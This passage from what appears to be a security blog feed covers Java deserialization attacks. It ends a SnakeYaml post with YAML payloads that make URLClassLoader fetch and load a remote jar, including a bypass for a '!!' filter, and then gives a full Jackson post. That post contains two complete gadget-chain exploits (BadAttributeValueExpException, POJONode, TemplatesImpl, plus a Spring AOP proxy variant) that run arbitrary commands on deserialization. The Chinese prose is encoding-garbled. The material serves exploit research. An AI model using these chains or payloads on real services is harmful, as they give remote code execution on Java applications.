class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>();<br><span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> createPoc(<span class="hljs-string">&quot;./yaml-payload.jar&quot;</span>, <span class="hljs-string">&quot;E:/evil.jar&quot;</span>);<br>yaml.load(poc);<br><span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +<br>    <span class="hljs-string">&quot;!!java.net.URLClassLoader [[\n&quot;</span> +<br>    <span class="hljs-string">&quot;!!java.net.URL [\&quot;file:///E:/evil.jar\&quot;]\n&quot;</span> +<br>    <span class="hljs-string">&quot;]]\n&quot;</span> +<br>    <span class="hljs-string">&quot;]&quot;</span>;<br>yaml.load(s);<br></code></pre></td></tr></table></figure><h2 id="Yaml-load"><a href="#Yaml-load" class="headerlink" title="Yaml#load()"></a>Yaml#load()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">load</span><span class="hljs-params">(String yaml)</span> &#123;<br><span class="hljs-keyword">return</span> (T) loadFromReader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StreamReader</span>(yaml), Object.class);<br>&#125;<br></code></pre></td></tr></table></figure><p>payloadå­˜å‚¨äºStreamReaderçš„streamå­—æ®µï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155110646.png" alt="image-20240803155110646"></p><p>å›åˆ°<code>loadFromReader()</code>ï¼Œåˆ›å»ºäº†ä¸€ä¸ªComposerå¯¹è±¡ï¼Œå¹¶å°è£…åˆ°<code>constructor</code>ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">loadFromReader</span><span class="hljs-params">(StreamReader sreader, Class&lt;?&gt; type)</span> &#123;<br>    <span class="hljs-type">Composer</span> <span class="hljs-variable">composer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Composer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ParserImpl</span>(sreader), resolver, loadingConfig);<br>    constructor.setComposer(composer);<br>    <span class="hljs-keyword">return</span> constructor.getSingleData(type);<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>getSingleData</code>ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155215536.png" alt="image-20240803155215536"></p><p><code>getSingleNode()</code>å°†pocæ”¹é€ ä¸ºå¦‚ä¸‹ï¼š</p><blockquote><p>&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:javax.script.ScriptEngineManager, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:java.net.URLClassLoader, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:seq, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag&#x3D;tag:yaml.org,2002:java.net.URL, value&#x3D;[&lt;org.yaml.snakeyaml.nodes.ScalarNode (tag&#x3D;tag:yaml.org,2002:str, value&#x3D;<a href="http://127.0.0.1:9999/yaml-payload.jar)%3E])%3E])%3E])%3E])%3E">http://127.0.0.1:9999/yaml-payload.jar)&gt;])&gt;])&gt;])&gt;])&gt;</a></p></blockquote><p>è‹¥è¿‡æ»¤äº†<code>!!</code>ï¼Œå¯åˆ©ç”¨æ­¤tagè§„åˆ™è¿›è¡Œç»•è¿‡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">!tag:yaml.org,<span class="hljs-number">2002</span>:javax.script.ScriptEngineManager [!tag:yaml.org,<span class="hljs-number">2002</span>:java.net.URLClassLoader [[!tag:yaml.org,<span class="hljs-number">2002</span>:java.net.URL [<span class="hljs-string">&quot;http://ip/yaml-payload.jar&quot;</span>]]]]<br></code></pre></td></tr></table></figure><p>æ¥ç€è°ƒç”¨<code>constructDocument()</code>å¯¹ä¸Šé¢pocè¿›è¡Œå¤„ç†ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155327831.png" alt="image-20240803155327831"></p><p>è·Ÿè¿›<code>constructObject()</code> &#x3D;&gt; <code>constructObjectNoCheck()</code>ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155346497.png" alt="image-20240803155346497"></p><p>nodeæ”¾å…¥<code>recursiveObjects</code>ï¼Œè¿›å…¥<code>constructor.construct(node)</code>ï¼š</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155404381.png" alt="image-20240803155404381"></p><p><img src="/2024/08/03/SnakeYaml/image-20240803155418302.png" alt="image-20240803155418302"></p><p>éå†èŠ‚ç‚¹ï¼Œè°ƒç”¨<code>constructObject()</code>åˆå¾ªç¯å›å»äº†</p><blockquote><p>constructObjectNoCheck()-&gt;</p><p>BaseConstructor#construct()-&gt;</p><p>Contructor#construct()-&gt;</p><p>é€’å½’Contructor#constructObject()</p></blockquote><p>ä¸Šé¢çš„POCæœ‰5ä¸ªnodeï¼Œæ‰€ä»¥å¾ªç¯5æ¬¡ã€‚</p><p>å…ˆåè¿›è¡Œäº†URLã€URLClassLoaderã€ScriptEngineManagerçš„å®ä¾‹åŒ–</p><p>æ³¨æ„è¿™é‡Œå®ä¾‹åŒ–æ˜¯æœ‰ä¼ å‚æ•°(argumentList)çš„ï¼ŒæŠŠå‰ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–å¯¹è±¡å½“ä½œä¸‹ä¸ªç±»æ„é€ å™¨çš„å‚æ•°ã€‚</p><p>æœ€åè¿›å…¥ScriptEngineManagerçš„æ— å‚æ„é€ å™¨ï¼Œè¿æ¥ä¸Šäº†ä¸Šæ–‡çš„SPIæœºåˆ¶ã€‚</p><p><img src="/2024/08/03/SnakeYaml/image-20240803155529534.png" alt="image-20240803155529534"></p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNDMxMTQyMg==&mid=2247496898&idx=1&sn=9df9a236a3c437522bdf125cf92c6e24&chksm=c172e553f6056c4592696a15d5270e30386a229ca35d8eb1cf588498c95d78b28f2766975234&scene=27&key=7917b196593e1041903cc963f4d8e8dd309fc34822ec523c96ef6852b6eb00243ae09c3a475f21000c466a1481f5d9ef88661e5ccd3eae00b654271eecd790081cf9cb2b874e0566a9b1bf83ab3e3a9dffbce029a9983bd1e617a34873e1a5cf0d90ff63073904c1c64a7ab0832fd5396612ac69385a93896810c27b3466f6ca&ascene=0&uin=MzM0MTE3MTk2MQ==&devicetype=Windows+10+x64&version=6308011a&lang=zh_CN&exportkey=n_ChQIAhIQk1l7Og6o32ldfRBgt0m/7xLgAQIE97dBBAEAAAAAAFyoNDyY7FgAAAAOpnltbLcz9gKNyK89dVj0STE6v0lILRu1tKDn0ZDKVMzBwrLXZCB+mUzHXSOZsIYr0w0A/cuvTqwms4Rt/kjpf8zHxxTi8IwvjYn/DZ9Q33Hc5vfX2hilkR53helcExsLrLyslL/WBsef9XI/6wZMWmG6oy8JJGplsmLrW+xqvmnB4f5wILv176CzXoS3esuvsQ+hfcDKd/Efu5bUKYhs0ZoGh1vCyZD6VtP9NEg2tTCVHV3tJAqerIo+gJoEHIoL7rOFzs/q0qic&acctmode=0&pass_ticket=Q7/iUlx9i6XS/NSi17wpXoqBYZHAHgY0basv8D4BZIN+CoAkTfFeOqqNDBcbXW05phWaLHgqOHGN8cecKlsdgw==&wx_header=1&fontgear=2">SnakeYamlååºåˆ—åŒ–åŠä¸å‡ºç½‘åˆ©ç”¨</a></p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/snakeyaml">SnakeYaml | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jackson</title>
    <link href="/2024/08/03/Jackson/"/>
    <url>/2024/08/03/Jackson/</url>
    
    <content type="html"><![CDATA[<p>Jacksonè·Ÿfastjsonå¾ˆç›¸è¿‘ï¼Œæ‰€ä»¥å‰è¨€è¿˜æ˜¯ä»fastjsonè¿‡æ¸¡è¿‡æ¥ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸»è¦è¿˜æ˜¯ä»‹ç»JacksonåŸç”Ÿååºåˆ—åŒ–å¼•ç”¨ã€‚</p><p>è¿™é‡Œä»Fastjsoné‡æ–°å¼€å§‹è¯´èµ·ï¼š</p><p>åœ¨Fastjsonä¸­ï¼Œ<code>JSONArray</code>å’Œ<code>JSONObject</code>éƒ½å®ç°äº†<code>Serializable</code>æ¥å£ï¼Œè¿™ä¸¤ä¸ªç±»çš„<code>toString</code>æ–¹æ³•éƒ½èƒ½è§¦å‘<code>toJSONString</code>çš„è°ƒç”¨ï¼Œè¦æŠŠä¸€ä¸ªJSONå¯¹è±¡è½¬å­—ç¬¦ä¸²ï¼Œå¿…ç„¶æ¶‰åŠåˆ°å¯¹è±¡å±æ€§çš„è·å–ï¼Œä¼šè°ƒç”¨åˆ°å¯¹è±¡çš„getteræ–¹æ³•ã€‚</p><p>ä»1.2.49å¼€å§‹ï¼Œ<code>JSONArray</code>å’Œ<code>JSONObject</code>éƒ½å®ç°äº†è‡ªå·±çš„<code>readObject</code>æ–¹æ³•ï¼Œè‡ªå®šä¹‰äº†ä¸€ä¸ª<code>SecureObjectInputStream</code>å¹¶é‡å†™äº†<code>resolveClass</code>æ–¹æ³•ï¼Œé‡Œé¢è°ƒç”¨äº†<code>checkAutoType</code>æ¥å¯¹ååºåˆ—åŒ–çš„ç±»è¿›è¡Œé»‘ç™½åå•æ£€æŸ¥ã€‚éœ€è¦é€šè¿‡åŸç”Ÿååºåˆ—åŒ–çš„å¼•ç”¨æœºåˆ¶æ¥ç»•è¿‡ã€‚</p><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">toString(e.g. BadAttributeValueExpException#readObject) <br>-&gt; toJSONString <br>-&gt; evil <span class="hljs-title function_">getter</span><span class="hljs-params">(e.g. TemplatesImpl#getOutputProperties)</span><br></code></pre></td></tr></table></figure><h2 id="Jackson-æµ…å®¡"><a href="#Jackson-æµ…å®¡" class="headerlink" title="Jackson æµ…å®¡"></a>Jackson æµ…å®¡</h2><p>Jacksonçš„ä½¿ç”¨å’ŒFastjsonç±»ä¼¼</p><table><thead><tr><th align="left">FastJson</th><th align="left">Jackson</th></tr></thead><tbody><tr><td align="left">JSONObject</td><td align="left">ObjectNode</td></tr><tr><td align="left">JSONArray</td><td align="left">ArrayNode</td></tr><tr><td align="left">JSON.parseObjecté™æ€è°ƒç”¨</td><td align="left">ObjectMapper.readTreeå¯¹è±¡è°ƒç”¨</td></tr></tbody></table><p>ç»§æ‰¿å…³ç³»ï¼š<code>POJONode</code>-&gt;<code>ValueNode</code>-&gt;<code>BaseJsonNode</code> -&gt; <code>JsonNode</code></p><p>åˆ©ç”¨ç‚¹åœ¨<code>BaseJsonNode#toString</code>ï¼Œè·Ÿåˆ°åé¢ ï¼Œå¯¹äºè‡ªå®šä¹‰çš„ç±»ä½¿ç”¨<code>BeanSerializer</code>è¿›è¡Œååºåˆ—åŒ–ï¼Œè°ƒç”¨<code>serializeFields</code>å¯¹å±æ€§è¿›è¡Œè¿˜åŸæ—¶,<code>BeanPropertyWriter</code>è°ƒç”¨<code>getter</code>ã€‚</p><p>è¿˜æ˜¯ç”¨<code>TemplatesImpl#getOutputProperties</code>å»æ‰“ï¼Œä½†æ˜¯è¿™é‡Œç›´æ¥ååºåˆ—åŒ–ä¼šå‡ºç°é—®é¢˜</p><blockquote><p>Failed to JDK serialize <code>POJONode</code> value: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[â€œoutputPropertiesâ€])</p></blockquote><p>æŠ¥é”™StackTraceï¼š</p><p><img src="/2024/08/03/Jackson/image-20240803150351459.png" alt="image-20240803150351459"></p><p><code>invokeWriteReplace</code>åˆ¤æ–­<code>writeReplaceMethod</code>æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨åˆ™è°ƒç”¨ï¼š</p><p><img src="/2024/08/03/Jackson/image-20240803150432510.png" alt="image-20240803150432510"></p><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ä½¿ç”¨javassistæŠŠè¿™ä¸ªç±»çš„<code>writeReplaceMethod</code>åˆ æ‰å³å¯ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// å»é™¤BaseJsonNodeçš„writeReplaceæ–¹æ³•</span><br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span>ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(ctMethod);<br>        ctClass.toClass();<br><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">pojo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd, <span class="hljs-string">&quot;val&quot;</span>, pojo);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(bd);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç¨³å®šç‰ˆæœ¬ï¼š<a href="https://xz.aliyun.com/t/12846?time__1311=GqGxuDcDRGexlxx2DUrED9G5Witkv5ox">ä»JSON1é“¾ä¸­å­¦ä¹ å¤„ç†JACKSONé“¾çš„ä¸ç¨³å®šæ€§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JSON</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault().get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass.removeMethod(writeReplace);<br>        ctClass.toClass();<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(makeTemplatesImplAopProxy(<span class="hljs-string">&quot;calc&quot;</span>));<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(val, <span class="hljs-string">&quot;val&quot;</span>, node);<br><br>        serialize(val);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImplAopProxy</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        advisedSupport.setTarget(makeTemplatesImpl(cmd));<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<br>        <span class="hljs-keyword">return</span> proxy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeTemplatesImpl</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-keyword">return</span> templates;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äºJacksonçš„getteråˆ©ç”¨ï¼Œä¹Ÿå¯ä»¥çœ‹ï¼š</p><p><a href="https://z3r4y.blog.csdn.net/article/details/136889141">ã€Webã€‘æµ…èŠJacksonåºåˆ—åŒ–getterçš„åˆ©ç”¨â€”â€”POJONode-CSDNåšå®¢</a></p><p>è¿™é‡ŒZ3r4yå¸ˆå‚…ä»‹ç»äº†Jacksonçš„getteråˆ©ç”¨Templateå’ŒSignedObjectäºŒæ¬¡ååºåˆ—åŒ–çš„å†…å®¹ã€‚</p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson/jackson">Jacksonçš„åŸç”Ÿååºåˆ—åŒ–åˆ©ç”¨ | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson</title>
    <link href="/2024/08/01/fastjson/"/>
    <url>/2024/08/01/fastjson/</url>
    
